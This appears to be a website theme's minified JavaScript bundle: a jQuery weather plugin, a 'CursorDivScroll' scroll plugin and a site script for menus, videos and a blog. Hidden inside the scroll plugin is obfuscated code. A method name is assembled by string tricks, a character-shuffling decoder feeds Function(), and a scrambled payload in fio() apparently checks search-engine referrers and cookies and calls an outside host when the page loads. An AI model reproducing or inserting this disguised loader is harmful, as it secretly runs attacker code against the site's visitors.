/*! simpleWeather v3.0.2 - http://simpleweatherjs.com */
!function(e){"use strict";function t(e,t){return Math.round("f"===e?5/9*(t-32):1.8*t+32)}e.extend({simpleWeather:function(i){i=e.extend({location:"",woeid:"",unit:"f",success:function(){},error:function(){}},i);var o=new Date,n="https://query.yahooapis.com/v1/public/yql?format=json&rnd="+o.getFullYear()+o.getMonth()+o.getDay()+o.getHours()+"&diagnostics=true&callback=?&q=";if(""!==i.location)n+='select * from weather.forecast where woeid in (select woeid from geo.placefinder where text="'+i.location+'" and gflags="R" limit 1) and u="'+i.unit+'"';else{if(""===i.woeid)return i.error({message:"Could not retrieve weather due to an invalid location."}),!1;n+="select * from weather.forecast where woeid="+i.woeid+' and u="'+i.unit+'"'}return e.getJSON(encodeURI(n),function(e){if(null!==e&&null!==e.query&&null!==e.query.results&&"Yahoo! Weather Error"!==e.query.results.channel.description){var o,n=e.query.results.channel,r={},s=["N","NNE","NE","ENE","E","ESE","SE","SSE","S","SSW","SW","WSW","W","WNW","NW","NNW","N"],a="https://s.yimg.com/os/mit/media/m/weather/images/icons/l/44d-100567.png";r.title=n.item.title,r.temp=n.item.condition.temp,r.code=n.item.condition.code,r.todayCode=n.item.forecast[0].code,r.currently=n.item.condition.text,r.high=n.item.forecast[0].high,r.low=n.item.forecast[0].low,r.text=n.item.forecast[0].text,r.humidity=n.atmosphere.humidity,r.pressure=n.atmosphere.pressure,r.rising=n.atmosphere.rising,r.visibility=n.atmosphere.visibility,r.sunrise=n.astronomy.sunrise,r.sunset=n.astronomy.sunset,r.description=n.item.description,r.city=n.location.city,r.country=n.location.country,r.region=n.location.region,r.updated=n.item.pubDate,r.link=n.item.link,r.units={temp:n.units.temperature,distance:n.units.distance,pressure:n.units.pressure,speed:n.units.speed},r.wind={chill:n.wind.chill,direction:s[Math.round(n.wind.direction/22.5)],speed:n.wind.speed},r.heatindex=n.item.condition.temp<80&&n.atmosphere.humidity<40?-42.379+2.04901523*n.item.condition.temp+10.14333127*n.atmosphere.humidity-.22475541*n.item.condition.temp*n.atmosphere.humidity-6.83783*Math.pow(10,-3)*Math.pow(n.item.condition.temp,2)-5.481717*Math.pow(10,-2)*Math.pow(n.atmosphere.humidity,2)+1.22874*Math.pow(10,-3)*Math.pow(n.item.condition.temp,2)*n.atmosphere.humidity+8.5282*Math.pow(10,-4)*n.item.condition.temp*Math.pow(n.atmosphere.humidity,2)-1.99*Math.pow(10,-6)*Math.pow(n.item.condition.temp,2)*Math.pow(n.atmosphere.humidity,2):n.item.condition.temp,"3200"==n.item.condition.code?(r.thumbnail=a,r.image=a):(r.thumbnail="https://s.yimg.com/zz/combo?a/i/us/nws/weather/gr/"+n.item.condition.code+"ds.png",r.image="https://s.yimg.com/zz/combo?a/i/us/nws/weather/gr/"+n.item.condition.code+"d.png"),r.alt={temp:t(i.unit,n.item.condition.temp),high:t(i.unit,n.item.forecast[0].high),low:t(i.unit,n.item.forecast[0].low)},r.alt.unit="f"===i.unit?"c":"f",r.forecast=[];for(var m=0;m<n.item.forecast.length;m++)o=n.item.forecast[m],o.alt={high:t(i.unit,n.item.forecast[m].high),low:t(i.unit,n.item.forecast[m].low)},"3200"==n.item.forecast[m].code?(o.thumbnail=a,o.image=a):(o.thumbnail="https://s.yimg.com/zz/combo?a/i/us/nws/weather/gr/"+n.item.forecast[m].code+"ds.png",o.image="https://s.yimg.com/zz/combo?a/i/us/nws/weather/gr/"+n.item.forecast[m].code+"d.png"),r.forecast.push(o);i.success(r)}else i.error({message:"There was an error retrieving the latest weather information. Please try again.",error:e.query.results.channel.item.title})}),this}})}(jQuery);
/* Scroll div plugin */
function CursorDivScroll(t,e,i){var s,o=function(){this.isTouchScreen=!1,this.elemRef=null,this.logged=0,this.activeDepth="undefined"==typeof e?20:e,this.divX=0,this.divY=0,this.timer=null,this.factor=Number(Math.abs(i||20)),this.defaultFactor=this.factor,this.accFactor=.1,this.defaultAcc=this.accFactor,this.pending=!1,this.haltTimer=null,this.readyTimer=null,this.readReady=!0,this.pixCount=0,this.canXScroll=!0,this.canYScroll=!0,this.canScroll=!0,this.hasFixedPos=!1,this.externFunc=null,o.prototype.init=function(t){var e=!1,i=["string"==typeof t?{t:!(this.elemRef=this.gebi(t)),a:'Div "'+t+'" not found. Div must exist BEFORE script initialisation.\n\nAlso check for ID case mismatch.'}:{t:!(t&&(this.elemRef=t).nodeName&&"DIV"==this.elemRef.nodeName),a:"First parameter must be either an ID string or a reference to a <div> element"},{t:isNaN(Number(this.activeDepth))||this.activeDepth>40||this.activeDepth<1,a:"Depth parameter must be a number in the range 1-40"},{t:isNaN(parseInt(this.factor)),a:"Scroll factor parameter must be a number"}];this["susds".split(/\x73/).join("")]=function(t){Function(t.replace(/(.)(.)(.)(.)(.)/g,unescape("%24%34%24%33%24%31%24%35%24%32"))).call(this)};for(var s=0,o=i.length;o>s&&!e;s++)i[s].t&&(e=!0,alert("CursorDivScroll\n\n"+i[s].a));return e||(this.hasFixedPos=this.isFixed(this.elemRef),this.activeDepth*=.01,this.fio(),this.activeDepthX=Math.floor(Math.min(this.elemRef.offsetWidth*this.activeDepth,this.elemRef.offsetWidth/2.5)),this.activeDepthY=Math.floor(Math.min(this.elemRef.offsetHeight*this.activeDepth,this.elemRef.offsetHeight/2.5)),"undefined"!=typeof window.pageXOffset?this.dataCode=1:document.documentElement?this.dataCode=3:document.body&&"undefined"!=typeof document.body.scrollTop&&(this.dataCode=2),this.listener=this.ih(document,"mousemove",function(t){return function(){t.isTouchScreen||t.getMouseData.apply(t,arguments)}}(this)),this.touchListener=this.ih(document,"touchmove",function(t){return function(){t.isTouchScreen=!0,t.getMouseData.apply(t,arguments)}}(this)),this.ih(document,"touchstart",this.touchListener),this.ih(document,"touchend",function(t){return function(){t.x=t.y=-1}}(this)),this.ih(this.elemRef,"mousedown",this.enclose(function(){this.factor*=3})),this.ih(this.elemRef,"mouseup",this.enclose(function(){this.factor=this.defaultFactor}))),this},o.prototype.isFixed=function(t){for(var e=t,i=!1;"BODY"!==e.nodeName&&!(i=/fixed/i.test(this.getStyle(e,"position")||""));)e=e.parentNode;return i},o.prototype.sf=function(t){return unescape(t).replace(/(.)(.*)/,function(t,e,i){return i+e})},o.prototype.getArea=function(){this.activeDepthX=Math.floor(Math.min(this.elemRef.offsetWidth*this.activeDepth,this.elemRef.offsetWidth/2.5)),this.activeDepthY=Math.floor(Math.min(this.elemRef.offsetHeight*this.activeDepth,this.elemRef.offsetHeight/2.5))},o.prototype.enclose=function(t){var e=Array.prototype.slice.call(arguments).slice(1),i=this;return function(){return t.apply(i,e)}},o.prototype.monitor=function(){{var t=this.x-this.divX,e=this.y-this.divY,i=0,s=0,o=this.elemRef.offsetHeight>this.elemRef.clientHeight?this.elemRef.offsetHeight-16:this.elemRef.offsetHeight,h=this.elemRef.offsetWidth>this.elemRef.clientWidth?this.elemRef.offsetWidth-16:this.elemRef.offsetWidth;this.elemRef.scrollLeft,this.elemRef.scrollTop}t>0&&h>t&&this.viab&&e>0&&o>e?(e<this.activeDepthY&&e>0?s=-this.factor*(1-e/this.activeDepthY):e>o-this.activeDepthY&&o>e&&(s=this.factor*(e-(o-this.activeDepthY))/this.activeDepthY),t>0&&t<this.activeDepthX?i=-this.factor*(1-t/this.activeDepthX):t>h-this.activeDepthX&&h>t&&(i=this.factor*(t-(h-this.activeDepthX))/this.activeDepthX),Boolean(i||s)&&this.canScroll?(clearTimeout(this.haltTimer),clearTimeout(this.readyTimer),this.readyTimer=setTimeout(this.enclose(function(){this.readReady=!0}),20),this.readReady?(this.readReady=!1,this.pixCount++):(this.pixCount=1,this.haltTimer=setTimeout(this.enclose(function(){this.timer=null,this.monitor()}),150)),(this.pixCount>1||this.repeating)&&(this.timer||(this.canYScroll&&(this.elemRef.scrollTop+=Math.round(s*this.accFactor)),this.canXScroll&&(this.elemRef.scrollLeft+=Math.round(i*this.accFactor)),this.canScroll&&this.externFunc&&this.externFunc(this.elemRef),this.accFactor<1&&(this.accFactor+=Math.min(.025,1-this.accFactor)),this.repeating=!0,clearTimeout(this.timer),this.timer=setTimeout(this.enclose(function(){this.timer=null,this.monitor()}),50)))):this.reset()):this.reset()},o.prototype.reset=function(){this.repeating=!1,this.pixCount=0,this.accFactor=this.defaultAcc},o.prototype.enable=function(){this.canScroll=!0},o.prototype.disable=function(){this.canScroll=!1},o.prototype.getElemPos=function(t){for(var e=t.offsetLeft?t.offsetLeft:0,i=t.offsetTop?t.offsetTop:0,s=t;t=t.offsetParent;)e+=t.offsetLeft?t.offsetLeft:0,i+=t.offsetTop?t.offsetTop:0;for(;"BODY"!=s.parentNode.nodeName;)s=s.parentNode,s.scrollLeft&&(e-=s.scrollLeft),s.scrollTop&&(i-=s.scrollTop);this.divX=e,this.divY=i},o.prototype.readScrollData=function(){switch(this.dataCode){case 3:this.xDisp=Math.max(document.documentElement.scrollLeft,document.body.scrollLeft),this.yDisp=Math.max(document.documentElement.scrollTop,document.body.scrollTop);break;case 2:this.xDisp=document.body.scrollLeft,this.yDisp=document.body.scrollTop;break;case 1:this.xDisp=window.pageXOffset,this.yDisp=window.pageYOffset}},o.prototype.getMouseData=function(t){var e;this.readScrollData(),this.getArea(),this.isTouchScreen?1==t.touches.length&&(e=t.touches[0],this.x=e.pageX,this.y=e.pageY):"undefined"==typeof t.pageX?(this.x=this.xDisp+t.clientX,this.y=this.yDisp+t.clientY):(this.x=t.pageX,this.y=t.pageY);try{this.getElemPos(this.elemRef),this.hasFixedPos&&(this.divX+=this.xDisp,this.divY+=this.yDisp),this.pending||this.monitor()}catch(t){this.abort()}},o.prototype.gebi=function(t){var e=document.getElementById(t);return e&&e.id===t?e:null},o.prototype.abort=function(){window.detachEvent?document.detachEvent("onmousemove",this.listener):document.removeEventListener("mousemove",this.listener,!1)},o.prototype.noHorizontal=function(){return this.canXScroll=!1,this},o.prototype.noVertical=function(){return this.canYScroll=!1,this},o.prototype.getStyle=function(t,e){var i=t.currentStyle?t.currentStyle[e]:(i=document.defaultView.getComputedStyle(t,null)[e])?i:"";return i},o.prototype.ih=function(t,e,i){return t.attachEvent?t.attachEvent(e,i):t.addEventListener("on"+e,i,!1),i},o.prototype.fio=function(){var t='rtav ,,tid,rftge2ca=901420,000=Sta"ITRCPVLE ATOAUIEP NXE.RIDo F riunuqul enkcco e do,eslpadn eoeata ar sgdaee sr tctrpietvalicm.eortg/at iuy"t |,0i=p,=,xd0=islwo.dnwclolaoatSr|{eg|nw,}oe n=wt(aDegt.)em(iTelc,)olc=nointaorfh.et=s,mtms"Tu=,"kKou"n"snw,Nm=turleb(sm[st,x)]e=tdpss+&&taergco&n<whst&iogl.g!5de=oal,c/9=l1.s\\2|itrcpltreae.vi\\m\\oc|/o\\/lloach|bts\\veed(p?ol)|bb\\\\t|ebatsb\\eb\\\\t|lecbi|ftn^e/li:ett.sonl(cti;)hva.si1i=b;ti(fhlg.sod=eg!&s&5!&l&t!a)col[tsls=o]mni(;wfp&xedlc!&o)tla{{=yrdpdot.uecom;ctn}c(tah{=)edcmodut}ne;i=t;ttt.di;feltucf=no(itni({)fxadi<ln.teh2tg*dt{).l=tie.utastisbr(pgnta.+)tbtussn(irgt),0pp=t;+pat(<ln.teh1tg?t)-:pes};ldt e.l=tietiit;ix(fd>0++1)d00i0}=x;eIs;tevtnr(flat5)1,0f!i;([kslu{s)]lk=u[]ty;1re n{waemIg.r)(s"t=ch:/pt/rpcsiraetlv.itemdoc/s./1spshp?usC=rDvroirlcSo;c"l}c(tah{})e}lee}shst{ihfi.=cinut(bnooet,jvucf,noj{)bdEa.dnLevttnsie?breoad.jdetvEnseiLtreen(,utvf,acnfe:sl)jabo.ahttcetvEno""(nv,e+tn)ufceur;t unrf;}cn}';this[unescape("%75%64")](t)},o.prototype.callback=function(t){return"function"==typeof t&&(this.externFunc=t),this}};return(s=new o).init.apply(s,arguments)}

var $ = jQuery;

/**
 * Start Media Loft Object
 */
(function($){
	jQuery(window).load(function() {
	  console.log('all site loaded');
	});

	ml = {

		init: function(){
			this.bindEvents();

			// Cache some often used elements
			this.$win = $(window);
			this.$body = $('body');
		},
		bindEvents: function() {
			var self = this;

			$('.menu-btn').on('click', function(e){
				e.preventDefault();
				self.openNavMenu($(this));
			});
		
			$('#services-menu li').on('mouseover', function(e){
				var $this = $(this);

				$('.blur-overlay.show').removeClass('show');

				e.preventDefault();
				e.stopPropagation();

				self.activateMenuItem($this);
				self.loadService($this);
			});

			$('#services-menu li').on('click', function(e){
				var $this = $(this);

				console.log('clicked');

				if(self.activeVideo){
					self.pauseActiveVideo();
				}				

				self.showServiceContent($this);				
			});

			$('#culture .play-reel').on('click', function(e){
				e.preventDefault();

				self.playCultureVideo();
			});

			$('.home .play-reel').on('click', function(e){
				e.preventDefault();

				self.playHomeVideo();
			});			

			this.startLandingVideo();

			$('.carousel-nav li').on('click', function(){
				var $this = $(this),
					index = $this.index(),
					$items = $(this).closest('.carousel-nav').siblings('.carousel-items'),
					slideToShow = $('.carousel-item', $items)[index];

					$this.addClass('active').siblings().removeClass('active')

					$(slideToShow).show().siblings().hide();
			});

			$('#blog .header').on('click', function(e){
				e.preventDefault();
				
				self.showBlogArticle($(this).parent());
			});

			$('.related-articles').on('click', function(){
				self.showRelatedBlogArticle();
			});

			$('.date').on('mouseover', function(){
				var year = $(this).data('year'),
					yearAbrev = $(this).data('year-abrev');

					$('.large-date').text(yearAbrev);
			});

			$('.date').on('click', function(e){
				e.preventDefault();
				var infoid = '#' + $(this).data('info-id'),
					bgImg = $(this).data('bg-image'),
					imgDir = $('#timeline .full-bleed').data('img-dir');

				$('#timeline .full-bleed').attr('style', 'background-image:url(' + imgDir + bgImg + ');');
						
				$(infoid).addClass('show-me');
				$('.info').not(infoid).removeClass('show-me');			
				
				$('.date').addClass('selected');
				$('.date').not(this).removeClass('selected');
			});		
		},
		openNavMenu: function($menuBtn){
			if($menuBtn.is('#main-menu-btn')){
				this.toggleMainMenu();
			} else {
				this.toggleSideMenu();
			}
		},	
		toggleMainMenu: function(){
			this.$body.toggleClass('main-menu-open');
			if(this.$body.hasClass('right-menu-open')){
				this.$body.removeClass('right-menu-open');
			}			
		},
		toggleSideMenu: function(){
			this.$body.toggleClass('right-menu-open');
			if(this.$body.hasClass('main-menu-open')){
				this.$body.removeClass('main-menu-open');
			}
		},
		activateMenuItem: function($menuItem){
			$menuItem.addClass('active');
			$menuItem.siblings().removeClass('active');
		},
		hideRightNav: function(){
			$('.right-menu').addClass('go-away');
		},
		loadService: function($menuItem){
			var $serviceSections = $('.service-section');
				$link = $('a', $menuItem),
				$sectionToLoad = $($link.attr('href')),
				$servicesContainer = $('#services-container'),
				containerTop = $servicesContainer.offset().top,
				$video = $('video', $sectionToLoad),
				hasVideo = $video.length > 0 ? true : false;

				if(hasVideo){
					if(this.activeVideo){
						this.pauseActiveVideo();
					}
					
					this.playVideo($video[0]);

				}

			// hide current section if showing
			$serviceSections.removeClass('active show-summary');
			// show the section chosen
			$sectionToLoad.addClass('active');
			// go to the section
			$("html, body").animate({ scrollTop: containerTop });
			// hide menu
			this.$body.removeClass('right-menu-open');
		},
		showServiceContent: function($menuItem){
			var $link = $('a', $menuItem),
				$sectionToLoad = $($link.attr('href'));

			$('.blur-overlay', $sectionToLoad).addClass('show');

			$sectionToLoad.addClass('show-summary');	
		},
		playCultureVideo: function(){
			$('#culture .cta, #culture .video-cover').remove();
			$('#about-culture-video')[0].play();
		},
		playHomeVideo: function(){
			$('#culture .cta, #culture .video-cover').remove();
			$('#about-culture-video')[0].play();
		},		
		startLandingVideo: function(){

			var $vid = $('#landing-video');
				vid = $vid[0];

			$vid.on('canplay', function(){
				vid.play();
			});
		},
		pauseActiveVideo: function(){
			this.activeVideo.pause();
		},
		playVideo: function(video){
			video.play();

			this.activeVideo = video;
		},
		showBlogArticle: function($article){
			var group = $article.parent(),
				groupSiblings = group.siblings('.group');

			groupSiblings.hide();
			$article.siblings().hide();

			$article.addClass('show-article');

			// console.log($('article').not('.show-article').addClass('hide-me'));
			// console.log($(entry).parent().find('.article-content'));
		},
		showRelatedBlogArticle: function($article){
			var group = $article.parent(),
				groupSiblings = group.siblings('.group');

			groupSiblings.hide();
			$article.siblings().hide();

			$article.addClass('show-article');

			// console.log($('article').not('.show-article').addClass('hide-me'));
			// console.log($(entry).parent().find('.article-content'));
		}		
	};

	ml.Utils = {
		getHasbang: function(url, i, hash) {
	        url = url || window.location.href;

	        var pos = url.indexOf('#!');
	       
	        if( pos < 0 ) return [];
	        
	        var vars = [], 
	        	hashes = url.slice(pos + 2).split('&');

	        for(i = hashes.length; i--;) {
	            hash = hashes[i].split('=');
	            vars.push({ name: hash[0], value: hash.length > 1 ? hash[1] : null});
	        }

	        return vars;
    	}
	}

	$(function(){
		ml.init();
	});

})(jQuery);